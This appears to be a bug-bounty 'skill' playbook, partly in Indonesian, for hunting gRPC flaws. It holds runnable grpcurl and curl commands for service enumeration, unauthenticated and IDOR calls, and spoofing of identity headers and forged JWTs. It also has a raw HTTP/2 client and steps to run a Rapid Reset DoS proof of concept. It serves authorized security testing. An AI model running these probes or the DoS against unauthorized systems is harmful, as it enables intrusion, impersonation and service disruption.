---
name: hunt-grpc
description: "Hunt gRPC vulnerabilities — server reflection enabled (enumerate all services/methods), missing authentication / metadata-stripping on internal endpoints, plaintext gRPC over HTTP/2, internal endpoint disclosure, proto file leakage, gRPC-Web/grpc-gateway transcoding injection, and HTTP/2 Rapid Reset DoS (CVE-2023-44487). Use when target exposes port 50051 / 443 / 8443 / 9090 with HTTP/2, when grpcurl/grpcui detects reflection, when an Envoy or grpc-gateway proxy is fronting a microservice, or when recon reveals a microservice architecture."
sources: hackerone_public, grpc_security_research, cert_cc_advisory
report_count: 6
---

# HUNT-GRPC — gRPC Security

## Crown Jewel Targets

gRPC reflection enabled = full service catalog enumeration without source code. The highest-value gRPC bugs come from the architectural assumption that a service is "internal" — auth is enforced at the edge proxy, and the backend trusts any caller that reaches it. Once you reach the backend directly (exposed port, SSRF, proxy bypass), that trust collapses.

**Highest-value findings:**
- **Reflection enabled in production** — `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` lists every method, message, and internal service. Enumeration enabler, not a vuln on its own (see Validation).
- **Missing auth on internal service** — a service designed for east-west microservice traffic exposed externally with no mTLS and no per-method authorization → call privileged methods directly.
- **Edge-auth-only / metadata-stripping** — proxy authenticates the user but the backend re-trusts proxy-injected headers (`x-user-id`, `x-tenant-id`, `x-forwarded-*`); if you reach the backend or can inject those headers via the proxy, you impersonate any tenant.
- **Plaintext gRPC** — gRPC h2c (cleartext HTTP/2) on a non-standard port → credential/metadata interception.
- **HTTP/2 Rapid Reset DoS (CVE-2023-44487)** — interleaved HEADERS + immediate RST_STREAM frames bypass `MAX_CONCURRENT_STREAMS` accounting → resource exhaustion. **DoS is in scope on almost no program — get explicit written authorization before sending a single burst.**

---

## Phase 1 — Fingerprint & Port Discovery

```bash
# Common gRPC ports (50051 native; 443/8443 via TLS+ALPN h2; 9090/8080 h2c)
nmap -sV -p 50051,50052,443,9090,8080,8443,6565,9000 $TARGET 2>/dev/null | grep open

# ALPN must negotiate h2 — gRPC cannot run on HTTP/1.1
echo | openssl s_client -alpn h2 -connect $TARGET:443 2>/dev/null | grep -i "ALPN.*h2"

# Native-gRPC fingerprint: an HTTP/2 POST to a bogus method returns a grpc-status
# trailer (12 = UNIMPLEMENTED) even when the path is wrong — strong signal it's gRPC.
curl -s --http2-prior-knowledge -X POST "http://$TARGET:9090/x.Y/Z" \
  -H "content-type: application/grpc" -o /dev/null -D - | grep -i grpc-status

# TLS-fronted h2 (port 443): look for grpc-status trailer / grpc content-type
curl -s --http2 -X POST "https://$TARGET/grpc.health.v1.Health/Check" \
  -H "content-type: application/grpc-web+proto" -o /dev/null -D - | grep -i "grpc-status\|content-type"
```

`grpc-status` trailer present ⇒ a gRPC server (or grpc-gateway/Envoy) is behind that port. `UNIMPLEMENTED` on a random path is normal and only confirms the transport — not a finding.

---

## Phase 2 — Service Enumeration via Reflection

```bash
brew install grpcurl   # or: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services — -plaintext for h2c, -insecure for self-signed TLS, plain for valid TLS
grpcurl -plaintext $TARGET:50051 list
grpcurl -insecure  $TARGET:443   list

# Typical output when reflection is on:
#   grpc.reflection.v1.ServerReflection
#   grpc.health.v1.Health
#   user.UserService
#   admin.AdminService
#   payment.PaymentService

# List + describe every method of each service
grpcurl -plaintext $TARGET:50051 list admin.AdminService
grpcurl -plaintext $TARGET:50051 describe admin.AdminService.DeleteUser
grpcurl -plaintext $TARGET:50051 describe .admin.DeleteUserRequest   # message schema

# Dump the whole catalog to triage interesting surfaces
for SVC in $(grpcurl -plaintext $TARGET:50051 list); do
  echo "== $SVC =="; grpcurl -plaintext $TARGET:50051 list "$SVC"
done | tee grpc-catalog.txt
grep -iE 'admin|internal|debug|secret|impersonate|exec|migrate|reset|delete' grpc-catalog.txt
```

**Reflection disabled?** You can still call known methods if you can guess them, or rebuild the descriptor set from a leaked `.proto` (Phase 5) and pass it with `grpcurl -protoset bundle.bin ...`. Reflection-off is a hardening control, not a security boundary.

---

## Phase 3 — Call Methods Without Authentication (authz testing)

```bash
# Baseline: call a sensitive method with NO auth metadata
grpcurl -plaintext $TARGET:50051 -d '{}' admin.AdminService/ListUsers

# IDOR across an enumerable id field
for ID in 1 2 3 100 1000 1001; do
  echo "id=$ID"; grpcurl -plaintext $TARGET:50051 \
    -d "{\"user_id\": $ID}" user.UserService/GetUser 2>&1 | head -4
done
```

**Interpret the gRPC status code, not just whether bytes came back (see Validation):**
- `OK` + populated response → method executed unauthenticated → finding.
- `Unauthenticated (16)` / `PermissionDenied (7)` → authz is enforced; NOT a finding.
- `Unimplemented (12)` → wrong path / method not on this server.
- `InvalidArgument (3)` → reached and parsed your input → method is callable; fix the payload and retry.

---

## Phase 3b — Probing gRPC WITHOUT grpcurl, reflection, or .proto files

Reflection off + no protos is the default on hardened mobile backends — the API map lives in the app binary, not a repo. You can still enumerate and call every method with a hand-rolled HTTP/2 gRPC client.

**Raw gRPC client (Python + `h2`) — works when grpcurl has nothing to describe against:**

```python
import socket, ssl, h2.connection, h2.config, h2.events

def grpc_call(host, path, message, timeout=15):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])               # gRPC requires ALPN h2 — assert it negotiated
    s = socket.create_connection((host, 443), timeout=timeout)
    ss = ctx.wrap_socket(s, server_hostname=host)
    conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
    conn.initiate_connection(); ss.sendall(conn.data_to_send())
    headers = [(":method","POST"),(":scheme","https"),(":authority",host),(":path",path),
               ("content-type","application/grpc"),("te","trailers")]
    # gRPC frame = 1-byte compression flag (0x00) + 4-byte big-endian length + protobuf payload
    frame = bytes([0]) + len(message).to_bytes(4, "big") + message
    conn.send_headers(1, headers); conn.send_data(1, frame, end_stream=True)
    ss.sendall(conn.data_to_send())
    # read events: ResponseReceived (headers), DataReceived (body), TrailersReceived (grpc-status)
```

**Empty-payload enumeration — the error text IS the schema.** Send a zero-length message to every method path extracted from the app binary:
- `"unknown variant \`get_public_address\`, expected one of \`assign_address_for_account\`, \`build_and_submit_transaction\`, ..."` → the server dumps its ENTIRE method list. One bogus-method request = full catalog.
- `"missing field \`account_id\`"` → the required field name. Iterate: send `{}`, read the field name, add it as protobuf field 1 string, repeat until the error changes class.
- `grpc-status 13` (INTERNAL) on malformed input → the method parses input BEFORE the auth check; keep shaping the payload.

**grpc-status location varies by proxy.** Cloudflare-fronted gRPC returns `grpc-status`/`grpc-message` in the RESPONSE HEADERS, not trailers. Always read both (`tr.get("grpc-status") or rh.get("grpc-status")`) or you will misread every proxied response as a timeout/no-response.

**Decode responses without .proto** — minimal varint wire parser: tag varint = `field << 3 | wiretype`; wt 0 = varint value, wt 2 = length-delimited (try UTF-8 string first, else recurse as nested message). Enough to confirm "this method returns real data" before investing in a rebuilt descriptor set.

**Where the method paths come from:** the mobile binary. See `mobile-pentest` → `references/flutter-apk-api-map-extraction.md` — `/pkg.v1.Service/Method` strings in `libapp.so` are the complete map.

## Phase 4 — Authentication / Trust-Boundary Bypass

```bash
# (a) Forged bearer / alg=none JWT in the authorization metadata
grpcurl -plaintext $TARGET:50051 \
  -H "authorization: REDACTED_********" \
  -d '{}' admin.AdminService/GetConfig

# (b) Backend-trusts-proxy headers: many gRPC backends authenticate at Envoy and
#     then trust identity injected as metadata. If the edge does not STRIP these,
#     spoofing them = full impersonation. Test every plausible name:
for H in "x-user-id: 1" "x-authenticated-user: admin" "x-tenant-id: 0" \
         "x-internal-request: true" "x-forwarded-for: 127.0.0.1" \
         "x-envoy-internal: true" "grpc-internal-encoding-request: true"; do
  echo "== $H =="
  grpcurl -plaintext $TARGET:50051 -H "$H" -d '{}' internal.InternalService/GetSecrets 2>&1 | head -3
done

# (c) Binary metadata smuggling — keys ending in -bin are base64-decoded by the
#     server; some auth middlewares only inspect text metadata, missing -bin keys.
grpcurl -plaintext $TARGET:50051 -H "auth-token-bin: $(printf admin|base64)" \
  -d '{}' admin.AdminService/GetConfig
```

The metadata-stripping bug (b) is the gRPC-specific crown jewel: confirm it by sending the spoofed header **directly to the backend port** AND, separately, **through the public proxy** — if the proxy forwards your `x-user-id` unchanged to the backend, it is exploitable for real users, not just on the bypassed port.

---

## Phase 5 — Proto File / Schema Discovery

```bash
# Proxies (Envoy/grpc-gateway) sometimes serve descriptors or swagger
for P in proto api/proto swagger.json openapiv2 service.swagger.json descriptor.pb; do
  S=$(curl -s -o /dev/null -w '%{http_code}' "https://$TARGET/$P")
  [ "$S" != 404 ] && echo "Found: /$P ($S)"
done

# Source/registry leakage of .proto definitions
gh search code --owner "$TARGET_ORG" 'syntax = "proto3"' --limit 20 2>/dev/null
gh search code --owner "$TARGET_ORG" 'service ' filename:.proto --limit 20 2>/dev/null

# Rebuild a descriptor set from leaked protos and drive the API without reflection
protoc --descriptor_set_out=bundle.bin --include_imports -I proto/ proto/*.proto
grpcurl -protoset bundle.bin -plaintext $TARGET:50051 list
```

Proto leakage on its own is low severity; its value is as the key that unlocks Phases 3–4 against a reflection-disabled target.

---

## Phase 6 — gRPC-Web / grpc-gateway / JSON-Transcoding Attacks

gRPC almost always reaches the browser through a transcoder: **Envoy `grpc_web`/`grpc_json_transcoder`**, **grpc-gateway** (REST↔gRPC), or **Connect**. These translators are the realistic external attack surface and frequently re-expose internal methods.

```bash
# (a) grpc-gateway maps gRPC methods to REST. Reflection-derived method names often
#     map predictably — hit them over plain HTTP/JSON (no gRPC client needed):
curl -s -X POST "https://$TARGET/v1/admin/users:list" -H 'content-type: application/json' -d '{}'
curl -s -X POST "https://$TARGET/admin.AdminService/ListUsers" \
  -H 'content-type: application/json' -d '{}'    # default unannotated route

# (b) Build a real gRPC-Web length-prefixed frame instead of a hand-waved one.
#     Frame = 1-byte flag (0x00=data) + 4-byte big-endian length + protobuf payload.
#     Encode the message with protoscope so the bytes are correct:
#       protoscope -s <<<'1: 1'  > msg.bin          # field 1 (e.g. user_id) = 1
MSG=$(xxd -p msg.bin | tr -d '\n')
LEN=$(printf '%08x' $((${#MSG}/2)))                 # 4-byte length prefix
FRAME=$(printf '00%s%s' "$LEN" "$MSG")
echo "$FRAME" | xxd -r -p > frame.bin
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' \
  --data-binary @frame.bin | xxd | head

# (c) grpc-web+json variant (Envoy/Connect) — no manual framing needed:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+json' -H 'x-grpc-web: 1' \
  -d '{"user_id": 1}'

# (d) Connect protocol (buf): plain JSON POST, unary, no framing:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/json' -H 'connect-protocol-version: 1' \
  -d '{"user_id": 1}'
```

Why this matters: the browser-facing transcoder commonly forwards to the SAME backend as the internal gRPC plane. If the transcoder route exposes `AdminService` or fails to require the auth the gRPC client would have sent, you have a real, externally-reachable authz bug. Confirm each transcoded route returns `OK` with sensitive data, and verify it is reachable as an unauthenticated/low-priv user (not just from inside the mesh).

---

## Phase 7 — HTTP/2 Rapid Reset DoS (CVE-2023-44487)

**Authorization gate:** DoS is out of scope on the overwhelming majority of programs. Do NOT run this without explicit, written, scoped permission and a target/window the program owner agreed to. Skip to Validation if unsure.

The attack is NOT a load test. It opens streams (HEADERS) and immediately cancels them (RST_STREAM) before the server finishes, so each cancelled stream frees a `MAX_CONCURRENT_STREAMS` slot instantly while the server still spends work on it — the client races far ahead of the concurrency cap. `h2load`/`ghz` are throughput benchmarkers; **they have no rapid-reset mode and never interleave HEADERS+immediate-RST_STREAM, so they cannot test this.**

**Correct tooling — author-sanctioned PoCs that actually emit the frame pattern:**
```bash
# CERT/CC + community tracking and PoCs for CVE-2023-44487:
#   https://kb.cert.org/vuls/id/421644
#   https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/  (Cloudflare writeup)
# Go PoC that sends HEADERS then immediate RST_STREAM in a tight loop:
git clone https://github.com/secengjeff/rapidresetclient
cd rapidresetclient && go build -o rapidreset .
# Detection-only: a SHORT, low-count burst, with permission, then STOP:
./rapidreset --help    # confirm current flags first, then a SMALL authorized burst, e.g.:
# ./rapidreset -url https://$TARGET:443 -concurrency 1 -requests 20

# If you must roll your own, use the h2 framing layer (golang.org/x/net/http2)
# to write a HEADERS frame immediately followed by RST_STREAM(CANCEL) per stream id.
```

**Detection without DoSing — prefer this:** the only thing you need to PROVE is whether mitigations are present. Check the server banner / version and whether it tracks reset floods:
```bash
# Fingerprint the HTTP/2 implementation and version (patched versions are known):
curl -sI --http2 https://$TARGET/ | grep -i '^server:'
# nghttp2 >=1.57.0, Go net/http with the 2023-10 fix, Envoy >=1.27.1/1.26.5/1.25.10/1.24.11,
# grpc-go >=1.56.3/1.57.1/1.58.3 are mitigated. Version-match instead of flooding.
```
Report the *version-confirmed* mitigation gap rather than a benchmark slowdown. "Server got slower under load" is not proof of CVE-2023-44487 — it produces false positives on slow/under-provisioned servers and false negatives on patched ones that throttle resets gracefully.

---

## Tools

```bash
grpcurl   # primary CLI client (list/describe/call, -protoset for reflection-off)
grpcui    # web UI for interactive exploration:  grpcui -plaintext $TARGET:50051
protoc + protoscope   # build/inspect raw protobuf and gRPC-Web frames (Phase 6)
buf       # lint/inspect proto, drive Connect endpoints
# DoS-only, AUTHORIZED engagements: secengjeff/rapidresetclient (true rapid-reset PoC).
#   NOTE: ghz and h2load are LOAD benchmarkers, NOT rapid-reset testers — do not
#   use them to "prove" CVE-2023-44487.
```

---

## Chain Table

| gRPC finding | Chain to | Impact |
|--------------|----------|--------|
| Reflection enabled | Enumerate all internal service methods + messages | Full API catalog disclosure (enabler) |
| Admin method, no auth | Call privileged RPCs (`DeleteUser`, `GetConfig`) | Data manipulation / system access — Critical |
| Proxy forwards `x-user-id`/`x-tenant-id` unstripped | Spoof identity metadata → cross-tenant impersonation | Tenant isolation bypass — Critical |
| IDOR via enumerable id field | Iterate `user_id` over `GetUser` | Mass PII exfil — High |
| grpc-gateway / gRPC-Web route re-exposes internal RPC | Hit transcoded REST/JSON path unauth | Externally-reachable authz bypass — High/Critical |
| Plaintext h2c on internal port | MITM / sniff metadata (bearer tokens) | Credential capture — High |
| `.proto` leak (repo/swagger) | `-protoset` to drive reflection-off target | Unlocks Phases 3–4 — Low alone, High as enabler |

Related skills: **hunt-idor** (id enumeration logic), **hunt-api-misconfig** (JWT alg=none / mass-assignment in request messages), **hunt-auth-bypass** (edge-vs-backend trust boundary), **hunt-tls-network** (h2c/plaintext + ALPN), **cloud-iam-deep** (if a called RPC returns cloud creds).

---

## Validation — false-positive discipline

gRPC's failure modes look like successes to a naive `grep`. Apply these gates before any submission.

1. **Status-code discrimination, not byte-counting.** A non-empty response can still be an error frame. Confirm the `grpc-status` trailer is `0` (OK). `Unauthenticated (16)` / `PermissionDenied (7)` mean auth WORKS — close the candidate. `Unimplemented (12)` means you have the wrong method. Re-run with `grpcurl -v` and read the trailers explicitly.

2. **Reflection / health endpoints are often intentionally public.** `grpc.reflection.*` and `grpc.health.v1.Health` being reachable is, by itself, **info disclosure (Low/Medium at most)** — many vendors ship reflection on by design. Do NOT report it as "missing auth" unless it leaks a non-public service catalog. The finding is the *sensitive* service you can then call without auth, proven in Phase 3.

3. **Distinguish "no auth" from "auth not required for THIS method."** Some methods (health, public catalog reads) are legitimately anonymous. Prove the bug by showing an authenticated-vs-unauthenticated **state delta**: the same RPC returns another user's/tenant's private data without credentials, or a mutating admin RPC executes (re-read the changed state to confirm side-effect).

4. **Proxy-vs-backend reachability.** A bug reachable only by hitting an internal `:50051` you found via SSRF/port-scan is real but its severity depends on reachability. State explicitly how an external attacker reaches it (exposed port, SSRF egress, proxy passthrough). For metadata-spoofing, prove the PUBLIC proxy forwards the spoofed header — not just the bypassed backend port.

5. **OOB / Collaborator for anything blind.** If an RPC takes a URL/host argument (webhook, import, render), it is an SSRF candidate: point it at a Burp Collaborator payload with a unique subdomain and confirm the DNS+HTTP interaction before claiming SSRF. No interaction = no SSRF. Hand off to **hunt-ssrf**.

6. **DoS is authorization-gated and version-verifiable.** Never submit CVE-2023-44487 off a benchmark "slowdown." Either (a) version-match an unpatched HTTP/2 stack from the `server:` banner, or (b) demonstrate the reset-flood ONLY under explicit written authorization with an agreed window — then stop immediately. A slow response is not proof.

**Severity guide (after the gates above pass):**
- Sensitive/admin RPC callable with no auth, side-effect proven → **Critical**
- Proxy-forwarded metadata spoofing → cross-tenant impersonation → **Critical**
- IDOR / mass PII via enumerable RPC → **High**
- Internal service externally reachable (transcoder or open port) → **High**
- Plaintext h2c leaking bearer metadata → **High**
- Reflection enabled exposing non-public catalog → **Medium** (enabler)
- Proto/descriptor leak, no callable sensitive method → **Low**

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Reflection aktif: `grpcurl -plaintext host:port list` | Peta layanan tanpa proto |
| 2 | Koneksi plaintext (h2c): coba tanpa TLS | Kredensial & data terbuka |
| 3 | Metadata auth: kirim request tanpa token metadata | Authz sering hanya di gateway |
| 4 | Enumerasi method: panggil setiap method dengan payload kosong | Method tanpa auth |
| 5 | Message fuzzing: field tak terduga, tipe salah, nilai besar | Parser longgar |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Gate 0 Validation

1. **Apa yang bisa dilakukan penyerang SEKARANG?** "Penyerang bisa memanggil method `AdminDelete` tanpa kredensial karena server mengizinkan koneksi plaintext."
2. **Apa yang hilang dari korban?** Data atau aksi yang berhasil. Sebutkan service dan method.
3. **Bisa direproduksi 10 menit dari nol?** Sertakan perintah `grpcurl` dan responsnya.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** eksploitasi gRPC surface

**Teknik pengembangan:** reflection enabled; method tanpa auth

**Eskalasi ke:** `hunt-idor` · `hunt-auth-bypass`

**Depth target:** L2 -> L4

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## 2026 sweep (dork pass 2026-10-26 — advisori terverifikasi dari NVD/GitHub/OWASP)

- **CVE-2026-33186 — gRPC-Go < 1.79.3: authorization bypass via missing leading slash in `:path`.** Interceptor otorisasi mengevaluasi string path mentah; aturan deny berbasis path kanonik gagal cocok ketika `:path` tidak diawali garis miring. CVSS 3.1 **9.1 CRITICAL**, CWE-285. Butuh frame HTTP/2 mentah.
  Lesson: **bypass authz lewat representasi path** — pola yang sama dengan HTTP/1.1 path normalization, tapi di lapisan gRPC. Kalau target memakai `grpc/authz` atau interceptor kustom berbasis `info.FullMethod`, uji path non-kanonik.
- **Praktik OWASP gRPC Security Cheat Sheet (2026): server reflection di produksi.** Reflection (`grpc.reflection.v1alpha.ServerReflection`) adalah ekuivalen **Swagger UI yang terekspos** — memberi penyerang peta layanan, method, dan tipe pesan.
  Lesson: `grpcurl -plaintext target:50051 list` yang berhasil = information disclosure yang bisa langsung dilaporkan, dan sekaligus pintu masuk untuk menguji setiap method tanpa proto file.
- **Praktik 2026: metadata trust.** Layanan internal sering mempercayai header seperti `x-user-id`, `x-tenant-id`, `x-internal: true` yang seharusnya diset oleh gateway. Kalau backend bisa dijangkau langsung, header itu bisa dipalsukan.
  Lesson: **authz yang bergantung pada header yang bisa diset klien bukan authz.** Uji dengan menghapus `authorization` dan menambah header internal — kalau `grpc-status: 0 (OK)` kembali, itu temuan.

**Probe inti:** reflection aktif (`grpcurl -plaintext host:port list`), koneksi plaintext/h2c, metadata auth (kirim tanpa token metadata), enumerasi method (panggil setiap method dengan payload kosong), dan message fuzzing (field tak terduga, tipe salah, nilai besar).


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

Server reflection aktif → enumerasi service penuh; interceptor authz yang mengevaluasi path non-kanonik (CVE-2026-33186, CVSS 9.1) → bypass authz. Kalibrasi: reflection di-internal-service tanpa data sensitif = Info; TLS + per-method authz = correct.
